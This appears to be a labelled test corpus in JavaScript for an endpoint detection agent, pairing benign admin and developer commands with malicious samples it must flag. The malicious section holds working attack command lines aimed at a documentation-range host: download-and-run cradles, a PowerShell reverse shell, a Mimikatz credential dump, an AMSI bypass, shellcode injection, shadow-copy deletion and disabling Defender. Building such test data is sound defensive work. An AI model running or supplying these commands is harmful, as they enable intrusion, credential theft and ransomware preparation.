// Labelled samples for Guard's endpoint detection: what must stay quiet and what must be caught.
//
//   benign     ordinary activity. Any alert at all is a false positive.
//   malicious  an attack technique. No alert for the expected rule, or one below `min`, is a
//              false negative.
//   policy     behaviour that is the same whether an admin or an attacker does it (an installer
//              piped into a shell, a Defender exclusion). Guard reports these on purpose, at a
//              stated severity, never above `max`.
//
// Add a sample here whenever a real false alarm or a missed detection is found, then make the
// test pass. Several of the benign samples are real alerts Guard raised on a developer's PC.
// Addresses use the documentation ranges (203.0.113.0/24, example.com).

const WIN = { id: 'gag_c0000000000000000001', name: 'OFFICE-PC', os: 'windows' };
const LIN = { id: 'gag_c0000000000000000002', name: 'web-01', os: 'linux' };
const T0 = Date.UTC(2026, 10, 16, 9);
let seq = 0;
const enc = (script) => Buffer.from(script, 'utf16le').toString('base64');
const baseName = (p) => String(p).split(/[\\/]/).pop();

function proc(cmdline, o = {}) {
  seq += 1;
  const first = cmdline.trim().startsWith('"') ? cmdline.trim().slice(1).split('"')[0] : cmdline.trim().split(/\s+/)[0];
  return {
    id: `c${seq}`,
    type: 'process.start',
    at: T0 + seq * 1000,
    host: o.host || WIN,
    process: {
      pid: 4000 + seq,
      name: o.name || baseName(o.path || first),
      path: o.path,
      cmdline,
      parents: (o.parents || []).map((name) => ({ name })),
    },
  };
}
const lin = (cmdline, o = {}) => proc(cmdline, { host: LIN, ...o });
function autostart(kind, name, command, o = {}) {
  seq += 1;
  return {
    id: `c${seq}`,
    type: 'persistence.created',
    at: T0 + seq * 1000,
    host: o.host || WIN,
    persistence: {
      kind,
      name,
      command,
      path: o.path,
      signer: o.signer,
      resolved: o.resolved,
      packageOwner: o.packageOwner,
    },
  };
}
const signed = (subject) => ({ status: 'valid', subject });
function lsass(path, access) {
  seq += 1;
  return {
    id: `c${seq}`,
    type: 'lsass.access',
    at: T0 + seq * 1000,
    host: WIN,
    process: { pid: 4000 + seq, name: baseName(path), path },
    detail: { access },
  };
}
function files(type, count, make, host = WIN) {
  return Array.from({ length: count }, (_, i) => {
    seq += 1;
    return { id: `c${seq}`, type, at: T0 + seq * 400, host, file: make(i) };
  });
}
const hex = (i) => (i * 2654435761).toString(16).padStart(8, '0').slice(-8);

// A parser helper of the kind developer tools start many times a day: it is passed as an
// encoded command, reads its input from stdin and decodes base64, but downloads and runs nothing.
const PARSER_HELPER = `function Write-Out($Json) {
    [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Json))
}
$Encoded = [Console]::In.ReadToEnd()
if (-not $Encoded) {
    Write-Out '{"valid":false,"errors":[{"message":"No command provided","errorId":"NoInput"}],"statements":[]}'
    exit 0
}
$Command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Encoded))
$tokens = $null
$parseErrors = $null
$ast = [System.Management.Automation.Language.Parser]::ParseInput($Command, [ref]$tokens, [ref]$parseErrors)
$names = [System.Collections.ArrayList]::new()
foreach ($c in $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true)) {
    [void]$names.Add(@{ name = $c.GetCommandName(); text = $c.Extent.Text; type = $c.GetType().Name })
}
$variables = [System.Collections.ArrayList]::new()
foreach ($v in $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.VariableExpressionAst] }, $true)) {
    [void]$variables.Add(@{ path = $v.VariablePath.ToString(); isSplatted = [bool]$v.Splatted })
}
$clean = ($tokens | ForEach-Object { $_.Text -replace '[\\u2013\\u2014\\u2015]','-' -replace '[\`''"]','' }) -join ' '
Write-Out (@{ valid = ($parseErrors.Count -eq 0); commands = $names; variables = $variables; text = $clean } | ConvertTo-Json -Compress -Depth 6)
${'# statement walkers follow, one per syntax node type\n'.repeat(90)}`;
const HELPER_CMD = `C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -NonInteractive -NoLogo -EncodedCommand ${enc(PARSER_HELPER)}`;
const DEV_PARENTS = ['claude.exe', 'Cursor.exe', 'Cursor.exe', 'explorer.exe'];
const CRADLE = 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a")';

const benign = (id, events, why) => ({ id, label: 'benign', events: [].concat(events), why });
const attack = (id, events, rule, min, extra = {}) => ({
  id,
  label: 'malicious',
  events: [].concat(events),
  expect: { rule, min },
  ...extra,
});
const policy = (id, events, rule, min, max, why) => ({
  id,
  label: 'policy',
  events: [].concat(events),
  expect: { rule, min, max },
  why,
});

export const CORPUS = [
  // ---------------------------------------------------------------- benign: PowerShell
  benign(
    'ps-dev-parser-helper',
    proc(HELPER_CMD, { parents: DEV_PARENTS }),
    'real false alarm: an editor assistant parsing a command',
  ),
  benign(
    'ps-dev-parser-helper-cut',
    proc(HELPER_CMD.slice(0, 8192), { parents: DEV_PARENTS }),
    'the same, cut off at 8,192 characters by agent 0.1.1',
  ),
  benign(
    'ps-encoded-listing',
    proc(
      `powershell.exe -NoProfile -NonInteractive -EncodedCommand ${enc('Get-ChildItem C:\\Users | Select-Object Name, LastWriteTime')}`,
    ),
  ),
  benign(
    'ps-encoded-hidden-maintenance',
    proc(
      `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${enc('Get-ScheduledTask | Where-Object State -eq Ready | Out-Null')}`,
    ),
    'vendors run hidden encoded maintenance commands',
  ),
  benign(
    'ps-bypass-vendor-script',
    proc('powershell.exe -ExecutionPolicy Bypass -File "C:\\Program Files\\Dell\\SupportAssist\\update.ps1"'),
  ),
  benign(
    'ps-vscode-shell-integration',
    proc(
      'powershell.exe -noexit -command "try { . \\"c:\\Users\\amy\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\out\\vs\\workbench\\contrib\\terminal\\common\\scripts\\shellIntegration.ps1\\" } catch {}"',
      { parents: ['Code.exe'] },
    ),
  ),
  benign('ps-npm-build', proc('pwsh.exe -NoLogo -Command "npm run build"')),
  benign(
    'ps-top-processes',
    proc('powershell.exe -NoProfile -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5"'),
  ),
  benign(
    'ps-download-and-unzip',
    proc(
      'powershell -Command "Invoke-WebRequest https://example.com/data.zip -OutFile C:\\Users\\amy\\Downloads\\data.zip; Expand-Archive C:\\Users\\amy\\Downloads\\data.zip"',
    ),
    'downloads a file, runs nothing',
  ),
  benign(
    'ps-port-check',
    proc('powershell -NoProfile -Command "(New-Object Net.Sockets.TcpClient).Connect(\'db01\', 5432)"'),
    'a socket that is opened and never read',
  ),
  benign(
    'ps-winforms',
    proc(
      "powershell -NoProfile -Command \"[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Done')\"",
    ),
  ),
  benign(
    'ps-signature-check',
    proc(
      'powershell.exe -NoProfile -NonInteractive -Command "Get-AuthenticodeSignature -LiteralPath $env:SVX_PATH | Select-Object Status"',
    ),
    "Guard's own publisher check",
  ),
  benign(
    'ps-defender-on',
    proc('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"'),
    'switching protection ON',
  ),
  benign(
    'ps-hidden-vendor-task',
    proc('powershell.exe -WindowStyle Hidden -File "C:\\Program Files\\Lenovo\\Vantage\\task.ps1"'),
  ),
  benign(
    'ps-base64-to-file',
    proc(
      'powershell -NoProfile -Command "$t = [Convert]::FromBase64String($env:CERT); [IO.File]::WriteAllBytes(\'C:\\Users\\amy\\cert.pfx\', $t)"',
    ),
    'decodes data, runs nothing',
  ),

  // ---------------------------------------------------------------- benign: developer and admin commands
  benign('git-status', proc('cmd.exe /c "git status"')),
  benign('git-fetch', proc('git.exe fetch origin main')),
  benign(
    'curl-to-file',
    proc('curl.exe -fsSL https://api.github.com/repos/nodejs/node/releases/latest -o release.json'),
  ),
  benign(
    'curl-pipe-jq',
    lin('bash -c "curl -s https://example.com/data.json | jq ."', { name: 'bash' }),
    'piped into a JSON tool, not a shell',
  ),
  benign(
    'curl-pipe-gpg',
    lin(
      'bash -c "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg"',
      { name: 'bash' },
    ),
  ),
  benign('wget-iso', lin('wget https://releases.ubuntu.com/24.04/ubuntu-24.04-live-server-amd64.iso')),
  benign('curl-save-installer', lin('curl -fsSL https://get.docker.com -o get-docker.sh')),
  benign('node-build', proc('node.exe C:\\Users\\amy\\project\\node_modules\\.bin\\vite build')),
  benign(
    'conhost-headless',
    proc('conhost.exe --headless --width 120 --height 30 --signal 0x5a4 --server 0x5a8'),
    'how terminals host a shell',
  ),
  benign('python-json', proc('python.exe -c "import json,sys; print(json.load(sys.stdin)[\'version\'])"')),
  benign(
    'python-hostname',
    lin('python3 -c "import socket; print(socket.gethostname())"'),
    'uses the socket module without spawning a shell',
  ),
  benign('ssh-restart', lin('ssh deploy@10.0.0.5 "systemctl restart app"')),
  benign('systemctl-restart-nginx', lin('systemctl restart nginx')),
  benign('systemctl-stop-apache', lin('systemctl stop apache2')),
  benign('crontab-list', lin('crontab -l')),
  benign('apt-install', lin('apt-get install -y nftables')),
  benign('tail-auth-log', lin('tail -n 100 /var/log/auth.log'), 'reading a log is not wiping it'),
  benign('nc-port-check', lin('nc -zv db01 5432')),
  benign('cat-passwd', lin('cat /etc/passwd'), 'world-readable; holds no passwords'),
  benign('docker-run', lin('docker run --rm -v /var/run/docker.sock:/var/run/docker.sock sandbox:latest')),
  benign('rsync-backup', lin('rsync -a /home/data /mnt/backup')),
  benign('certutil-hash', proc('certutil.exe -hashfile setup.exe SHA256')),
  benign('certutil-addstore', proc('certutil.exe -addstore -f Root C:\\certs\\corp-ca.cer')),
  benign('bitsadmin-list', proc('bitsadmin.exe /list /allusers')),
  benign('msiexec-local', proc('msiexec.exe /i "C:\\Users\\amy\\Downloads\\node-v22.msi" /qn')),
  benign('rundll32-control-panel', proc('rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL desk.cpl')),
  benign(
    'rundll32-open-website',
    proc('rundll32.exe url.dll,FileProtocolHandler https://www.example.com/help'),
    'how many programs open a link in the browser',
  ),
  benign('rundll32-printer', proc('rundll32.exe printui.dll,PrintUIEntry /in /n \\\\printsrv\\Floor2')),
  benign('regsvr32-program-files', proc('regsvr32.exe /s "C:\\Program Files\\Common Files\\App\\filter.dll"')),
  benign(
    'regsvr32-installer-temp',
    proc('regsvr32.exe /s C:\\Users\\amy\\AppData\\Local\\Temp\\is-AB12C.tmp\\helper.dll', {
      parents: ['setup.tmp', 'setup.exe'],
    }),
    'an installer registering its own DLL',
  ),
  benign(
    'schtasks-vendor-updater',
    proc(
      'schtasks.exe /create /tn "GoogleUpdateTaskMachineCore" /tr "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /c" /sc daily',
    ),
  ),
  benign('schtasks-query', proc('schtasks.exe /query /fo csv /nh')),
  benign(
    'sc-create-program-files',
    proc('sc.exe create BackupAgent binPath= "C:\\Program Files\\Backup\\agent.exe" start= auto'),
  ),
  benign('sc-stop-spooler', proc('sc.exe stop Spooler')),
  benign('net-stop-spooler', proc('net.exe stop spooler')),
  benign('wevtutil-query', proc('wevtutil.exe qe Security /c:5 /rd:true /f:text')),
  benign('vssadmin-list', proc('vssadmin.exe list shadows')),
  benign('vssadmin-create', proc('vssadmin.exe create shadow /for=C:'), 'making a backup'),
  benign('bcdedit-enum', proc('bcdedit.exe /enum')),
  benign('wmic-os', proc('wmic.exe os get caption,version')),
  benign('wmic-shadow-list', proc('wmic.exe shadowcopy list brief')),
  benign('reg-add-app-setting', proc('reg.exe add HKCU\\Software\\MyApp /v Theme /t REG_SZ /d dark /f')),
  benign(
    'reg-add-run-onedrive',
    proc(
      'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDrive /d "\\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\\" /background" /f',
    ),
  ),
  benign('reg-save-own-key', proc('reg.exe save HKCU\\Software\\MyApp C:\\backup\\myapp.hiv')),
  benign(
    'netsh-add-rule',
    proc(
      'netsh.exe advfirewall firewall add rule name="App" dir=in action=allow program="C:\\Program Files\\App\\app.exe"',
    ),
  ),
  benign('cscript-slmgr', proc('cscript.exe //nologo C:\\Windows\\System32\\slmgr.vbs /dli')),
  benign('wscript-program-files', proc('wscript.exe "C:\\Program Files\\Vendor\\notify.vbs"')),
  benign('taskkill-notepad', proc('taskkill.exe /f /im notepad.exe')),
  benign('net-user-list', proc('net.exe user')),
  benign('net-localgroup-list', proc('net.exe localgroup administrators')),
  benign('msbuild-solution', proc('msbuild.exe C:\\Users\\amy\\source\\repos\\App\\App.sln /p:Configuration=Release')),

  benign(
    'guard-install-over-ssh',
    lin(
      `bash -c "curl -fsSL https://app.example.com/api/endpoint-agent/v1/download/linux -o securovix-guard && echo \\"${'ab12'.repeat(16)}  securovix-guard\\" | sha256sum -c - && chmod +x securovix-guard && sudo ./securovix-guard install --server https://app.example.com --token svxe_org_1.${'c'.repeat(64)}"`,
      { name: 'bash' },
    ),
    "Guard's own install command, updating a machine",
  ),
  benign(
    'guard-install-windows',
    proc(
      `powershell.exe -Command "Invoke-WebRequest https://app.example.com/api/endpoint-agent/v1/download/windows -OutFile securovix-guard.exe -UseBasicParsing; if ((Get-FileHash securovix-guard.exe -Algorithm SHA256).Hash -ne '${'AB12'.repeat(16)}') { throw 'The download does not match the build on this server.' }; .\\securovix-guard.exe install --server https://app.example.com --token svxe_org_1.${'c'.repeat(64)}"`,
    ),
    "Guard's own install command, updating a machine",
  ),

  // ---------------------------------------------------------------- benign: processes
  benign(
    'svchost-real',
    proc('C:\\Windows\\System32\\svchost.exe -k netsvcs -p', { path: 'C:\\Windows\\System32\\svchost.exe' }),
  ),
  benign(
    'rundll32-syswow64',
    proc('C:\\Windows\\SysWOW64\\rundll32.exe shell32.dll,Options_RunDLL 0', {
      path: 'C:\\Windows\\SysWOW64\\rundll32.exe',
    }),
  ),
  benign('explorer-real', proc('C:\\Windows\\explorer.exe', { path: 'C:\\Windows\\explorer.exe' })),
  benign(
    'per-user-app',
    proc('"C:\\Users\\amy\\AppData\\Local\\Programs\\cursor\\Cursor.exe"', {
      path: 'C:\\Users\\amy\\AppData\\Local\\Programs\\cursor\\Cursor.exe',
    }),
  ),
  benign(
    'installer-from-downloads',
    proc('"C:\\Users\\amy\\Downloads\\ChromeSetup.exe"', { path: 'C:\\Users\\amy\\Downloads\\ChromeSetup.exe' }),
    'people run installers they downloaded',
  ),
  benign(
    'installer-from-temp',
    proc('C:\\Users\\amy\\AppData\\Local\\Temp\\{A1B2C3}\\setup.exe /install', {
      path: 'C:\\Users\\amy\\AppData\\Local\\Temp\\{A1B2C3}\\setup.exe',
    }),
  ),
  benign(
    'excel-print-helper',
    proc('C:\\Windows\\splwow64.exe 12288', { path: 'C:\\Windows\\splwow64.exe', parents: ['EXCEL.EXE'] }),
  ),
  benign(
    'outlook-opens-browser',
    proc('"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --single-argument https://example.com', {
      path: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      parents: ['OUTLOOK.EXE'],
    }),
  ),
  benign(
    'php-image-resize',
    lin('sh -c "convert /var/www/uploads/a.png -resize 200x200 /var/www/thumbs/a.png"', {
      name: 'sh',
      parents: ['php-fpm8.3'],
    }),
    'a website calling an image tool',
  ),

  // ---------------------------------------------------------------- benign: autostart entries
  benign(
    'autostart-mcafee-service',
    autostart(
      'service',
      'McAfee Scheduled Task - (McAfee-Dynamicappdownloader)',
      '"C:\\Program Files\\McAfee\\wps\\1.40.161.1\\dad\\3.42.108\\mc-dad.exe"',
    ),
    'real false alarm',
  ),
  benign(
    'autostart-edge-run-key',
    autostart(
      'run-key',
      'MicrosoftEdgeAutoLaunch_5D6EC03883EFAB7DF4F8719503BA1448',
      '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --no-startup-window --win-session-start',
    ),
    'real false alarm',
  ),
  benign(
    'autostart-mcafee-sustainability',
    autostart(
      'service',
      'McAfee Scheduled Task - (McAfee Scheduled Task - (mc-sustainability))',
      '"C:\\Program Files\\McAfee\\wps\\1.40.161.1\\sustainability\\mc-sustainability.exe"',
    ),
    'real false alarm',
  ),
  benign(
    'autostart-onedrive-per-user',
    autostart(
      'run-key',
      'OneDrive',
      '"C:\\Users\\amy\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
      { signer: signed('Microsoft Corporation') },
    ),
  ),
  benign(
    'autostart-discord',
    autostart('run-key', 'Discord', 'C:\\Users\\amy\\AppData\\Local\\Discord\\Update.exe --processStart Discord.exe', {
      signer: signed('Discord Inc.'),
    }),
  ),
  benign(
    'autostart-spotify-roaming',
    autostart('run-key', 'Spotify', 'C:\\Users\\amy\\AppData\\Roaming\\Spotify\\Spotify.exe --autostart --minimized', {
      signer: signed('Spotify AB'),
    }),
  ),
  benign(
    'autostart-edge-update-task',
    autostart(
      'scheduled-task',
      '\\MicrosoftEdgeUpdateTaskMachineCore',
      'C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe /c',
    ),
  ),
  benign(
    'autostart-windows-task-rundll32',
    autostart(
      'scheduled-task',
      '\\Microsoft\\Windows\\Autochk\\Proxy',
      '%windir%\\system32\\rundll32.exe /d acproxy.dll,PerformAutochkOperations',
    ),
  ),
  benign(
    'autostart-svchost-service',
    autostart('service', 'WaaSMedicSvc', 'C:\\Windows\\system32\\svchost.exe -k wusvcs -p'),
  ),
  benign(
    'autostart-driver-systemroot',
    autostart('service', 'mfehidk', '\\SystemRoot\\System32\\drivers\\mfehidk.sys'),
  ),
  benign('autostart-driver-relative', autostart('service', 'nvlddmkm', 'system32\\DRIVERS\\nvlddmkm.sys')),
  benign(
    'autostart-com-task',
    autostart('scheduled-task', '\\Microsoft\\Windows\\Shell\\IndexerAutomaticMaintenance', 'COM handler'),
  ),
  benign('autostart-no-command', autostart('service', 'BthA2dp', '')),
  benign(
    'autostart-defender-platform',
    autostart(
      'service',
      'WinDefend',
      '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe"',
    ),
  ),
  benign(
    'autostart-vendor-ps1-task',
    autostart(
      'scheduled-task',
      '\\Dell\\Update',
      'powershell.exe -ExecutionPolicy Bypass -File "C:\\Program Files\\Dell\\update.ps1"',
    ),
  ),
  benign(
    'autostart-windows-cscript-task',
    autostart(
      'scheduled-task',
      '\\Microsoft\\Office\\OfficeTelemetryAgentLogOn',
      '%windir%\\system32\\cscript.exe /B /nologo %systemroot%\\system32\\calluxxprovider.vbs $(Arg0)',
    ),
  ),
  benign(
    'autostart-guard-unit',
    autostart('systemd', 'securovix-guard.service', '/usr/local/bin/securovix-guard run', {
      host: LIN,
      path: '/etc/systemd/system/securovix-guard.service',
    }),
  ),
  benign(
    'autostart-certbot-cron',
    autostart(
      'cron',
      'certbot',
      "0 */12 * * * root test -x /usr/bin/certbot -a \\! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew",
      { host: LIN, path: '/etc/cron.d/certbot', packageOwner: 'certbot' },
    ),
  ),
  benign(
    'autostart-backup-cron',
    autostart('cron', 'backup', '0 3 * * * root /usr/local/bin/backup.sh', { host: LIN, path: '/etc/cron.d/backup' }),
  ),
  benign(
    'autostart-docker-unit',
    autostart('systemd', 'docker.service', '/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock', {
      host: LIN,
      path: '/etc/systemd/system/docker.service',
    }),
  ),
  benign(
    'autostart-cron-many-jobs',
    autostart(
      'cron',
      'maintenance',
      '0 3 * * * root /usr/local/bin/backup.sh\n15 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf\n@daily root /usr/bin/find /var/cache/app -mtime +7 -delete',
      { host: LIN, path: '/etc/cron.d/maintenance' },
    ),
  ),
  benign(
    'autostart-profile-script',
    autostart(
      'shell-profile',
      'go.sh',
      'export PATH=$PATH:/usr/local/go/bin\nif [ -x /usr/bin/dircolors ]; then eval "$(dircolors -b)"; fi',
      { host: LIN, path: '/etc/profile.d/go.sh' },
    ),
  ),
  benign(
    'autostart-startup-shortcut',
    autostart(
      'startup-folder',
      'Send to OneNote.lnk',
      '"C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTEM.EXE" /tsr',
    ),
  ),
  benign(
    'autostart-store-app',
    autostart(
      'run-key',
      'Teams',
      '"C:\\Users\\amy\\AppData\\Local\\Microsoft\\WindowsApps\\MSTeams_8wekyb3d8bbwe\\ms-teams.exe" msteams:system-initiated',
      { resolved: 'C:\\Program Files\\WindowsApps\\MSTeams_24215.1007.3082.1590_x64__8wekyb3d8bbwe\\ms-teams.exe' },
    ),
    'a Store app shortcut resolved by the agent',
  ),
  benign(
    'autostart-run-parts-cron',
    autostart('cron', 'crontab', '17 * * * * root cd / && run-parts --report /etc/cron.hourly', {
      host: LIN,
      path: '/etc/crontab',
    }),
  ),

  // ---------------------------------------------------------------- benign: file activity
  benign(
    'git-clone-in-documents',
    files('file.write', 60, (i) => ({
      path: `C:\\Users\\amy\\Documents\\GitHub\\app\\.git\\objects\\${hex(i).slice(0, 2)}\\${hex(i)}${hex(i + 7)}`,
      entropy: 7.93,
    })),
    'git stores compressed objects',
  ),
  benign(
    'npm-install-in-documents',
    files('file.write', 60, (i) => ({
      path: `C:\\Users\\amy\\Documents\\site\\node_modules\\pkg${i}\\build\\binding.node`,
      entropy: 7.7,
    })),
  ),
  benign(
    'compressed-cache-writes',
    files('file.write', 60, (i) => ({ path: `C:\\Users\\amy\\Documents\\Game\\cache\\chunk_${i}.pak`, entropy: 7.99 })),
    'a program writing its own compressed data',
  ),
  benign(
    'photo-batch-rename',
    files('file.rename', 40, (i) => ({
      oldPath: `C:\\Users\\amy\\Pictures\\trip\\IMG_${i}.jpeg`,
      path: `C:\\Users\\amy\\Pictures\\trip\\IMG_${i}.jpg`,
    })),
    'renaming to another ordinary type',
  ),
  benign(
    'browser-downloads-finishing',
    files('file.rename', 25, (i) => ({
      oldPath: `C:\\Users\\amy\\Downloads\\report-${i}.pdf.crdownload`,
      path: `C:\\Users\\amy\\Downloads\\report-${i}.pdf`,
    })),
  ),
  benign(
    'office-saves',
    files('file.rename', 25, (i) => ({
      oldPath: `C:\\Users\\amy\\Documents\\~WRD${i}.tmp`,
      path: `C:\\Users\\amy\\Documents\\minutes-${i}.docx`,
    })),
    'Word saves through a temporary file',
  ),
  benign(
    'backup-copies',
    files('file.rename', 25, (i) => ({
      oldPath: `C:\\Users\\amy\\Documents\\plan-${i}.xlsx`,
      path: `C:\\Users\\amy\\Documents\\plan-${i}.xlsx.bak`,
    })),
  ),
  benign(
    'old-agent-git-verdict',
    [
      {
        id: 'cv1',
        type: 'ransomware.detected',
        at: T0,
        host: WIN,
        file: { path: 'C:\\Users\\amy\\Documents\\GitHub\\app\\.git\\objects\\ab\\cdef0123' },
        detail: {
          reason: '30 files rewritten with encrypted-looking content within 30 seconds',
          files: 30,
          killed: false,
        },
      },
    ],
    'agent 0.1.1 reporting a git checkout',
  ),

  // ---------------------------------------------------------------- benign: LSASS handles and machine health
  benign(
    'lsass-task-manager',
    lsass('C:\\Windows\\System32\\Taskmgr.exe', '0x1000'),
    'a handle that cannot read memory',
  ),
  benign('lsass-browser-query', lsass('C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', '0x1000')),
  benign(
    'lsass-defender',
    lsass('C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe', '0x1410'),
  ),
  benign('lsass-mcafee', lsass('C:\\Program Files\\McAfee\\Engine\\mcshield.exe', '0x1410')),
  benign('agent-says-sleep', [{ id: 'cs1', type: 'agent.offline', at: T0, host: WIN, detail: { reason: 'sleep' } }]),
  {
    id: 'pc-asleep',
    label: 'benign',
    why: 'real false alarm: a PC that was switched off overnight',
    stale: {
      agents: [
        {
          id: WIN.id,
          hostname: 'Faraz',
          os: 'windows',
          osVersion: 'Windows 11 Home',
          status: 'active',
          lastSeenAt: T0 - 11 * 60_000,
        },
      ],
    },
  },
  {
    id: 'server-announced-shutdown',
    label: 'benign',
    why: 'the agent said it was shutting down',
    stale: {
      agents: [{ id: LIN.id, hostname: 'web-01', os: 'linux', status: 'active', lastSeenAt: T0 - 30 * 60_000 }],
      hosts: { [LIN.id]: { offline: { at: T0 - 30 * 60_000 + 500, reason: 'shutdown' } } },
    },
  },
  {
    id: 'server-marked-not-always-on',
    label: 'benign',
    why: 'the owner switched off the offline alert for it',
    stale: {
      agents: [{ id: LIN.id, hostname: 'build-box', os: 'linux', status: 'active', lastSeenAt: T0 - 30 * 60_000 }],
      expectOnline: { [LIN.id]: false },
    },
  },

  // ---------------------------------------------------------------- malicious: PowerShell
  attack(
    'ps-encoded-cradle',
    proc(`powershell.exe -NoP -W Hidden -EncodedCommand ${enc(CRADLE)}`),
    'encoded-powershell',
    'critical',
  ),
  attack(
    'ps-cradle-plain',
    proc('powershell -c "iwr http://203.0.113.5/a.ps1 | iex"', { name: 'powershell.exe' }),
    'encoded-powershell',
    'high',
  ),
  attack(
    'ps-clickfix',
    proc('powershell -w hidden -c "iex(irm https://cdn-verify.example/captcha.txt)"', {
      name: 'powershell.exe',
      parents: ['explorer.exe'],
    }),
    'encoded-powershell',
    'critical',
  ),
  attack(
    'ps-encoded-shadow-delete',
    proc(`powershell.exe -enc ${enc('vssadmin delete shadows /all /quiet')}`),
    'shadow-copy-deletion',
    'critical',
  ),
  attack(
    'ps-encoded-defender-off',
    proc(`powershell.exe -e ${enc('Set-MpPreference -DisableRealtimeMonitoring $true')}`),
    'defense-evasion',
    'high',
  ),
  attack(
    'ps-download-run',
    proc(
      'powershell -c "Invoke-WebRequest http://203.0.113.5/p.exe -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe"',
      { name: 'powershell.exe' },
    ),
    'encoded-powershell',
    'high',
  ),
  attack(
    'ps-downloadfile-run',
    proc(
      "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://203.0.113.5/p.exe','C:\\Users\\Public\\p.exe'); & 'C:\\Users\\Public\\p.exe'\"",
      { name: 'powershell.exe' },
    ),
    'encoded-powershell',
    'high',
  ),
  attack(
    'ps-reflective-load',
    proc(
      `powershell.exe -enc ${enc('$b=[Convert]::FromBase64String($x);[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)')}`,
    ),
    'encoded-powershell',
    'high',
  ),
  attack(
    'ps-shellcode',
    proc(
      `powershell.exe -nop -enc ${enc('$m=[Win32]::VirtualAlloc(0,$sc.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length);[Win32]::CreateThread(0,0,$m,0,0,0)')}`,
    ),
    'encoded-powershell',
    'critical',
  ),
  attack(
    'ps-amsi-bypass',
    proc(
      "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
      { name: 'powershell.exe' },
    ),
    'encoded-powershell',
    'critical',
  ),
  attack(
    'ps-reverse-shell',
    proc(
      'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'203.0.113.5\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length)}"',
      { name: 'powershell.exe' },
    ),
    'reverse-shell',
    'critical',
  ),
  attack(
    'ps-invoke-mimikatz',
    proc(
      'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.5/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"',
      { name: 'powershell.exe' },
    ),
    'credential-dumping',
    'critical',
  ),
  attack(
    'ps-string-concat-obfuscation',
    proc("powershell -c \"$a='ne'+'w-o'+'bj'+'ect';$b='ne'+'t.w'+'ebc'+'lie'+'nt'; iex ($a+' '+$b)\"", {
      name: 'powershell.exe',
    }),
    'encoded-powershell',
    'high',
  ),
  attack(
    'ps-char-code-obfuscation',
    proc('powershell -c "iex ([char]105+[char]101+[char]120+[char]32+[char]40+[char]41)"', { name: 'powershell.exe' }),
    'encoded-powershell',
    'high',
  ),
  attack(
    'ps-via-cmd',
    proc(`cmd.exe /c powershell -nop -w hidden -enc ${enc(CRADLE)}`),
    'encoded-powershell',
    'critical',
  ),
  attack(
    'ps-unreadable-payload',
    proc(
      `powershell.exe -enc ${Buffer.from(Array.from({ length: 240 }, (_, i) => (i * 73 + 11) % 256)).toString('base64')}`,
    ),
    'encoded-powershell',
    'medium',
  ),
  attack(
    'ps-gzip-loader',
    proc(
      `powershell.exe -nop -w hidden -enc ${enc('IEX (New-Object IO.StreamReader((New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAA"))),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()')}`,
    ),
    'encoded-powershell',
    'high',
  ),
  attack(
    'ps-padded-encoded-cradle',
    proc(`powershell.exe -enc ${enc(`${'# routine maintenance\n'.repeat(400)}${CRADLE}`)}`),
    'encoded-powershell',
    'critical',
    { why: 'the hostile line sits after 8,000 characters of padding' },
  ),

  // ---------------------------------------------------------------- malicious: ransomware preparation
  attack('shadow-vssadmin', proc('vssadmin.exe Delete Shadows /All /Quiet'), 'shadow-copy-deletion', 'critical'),
  attack(
    'shadow-wmic-where',
    proc('wmic.exe shadowcopy where "ID=\'{3f2a}\'" delete'),
    'shadow-copy-deletion',
    'critical',
  ),
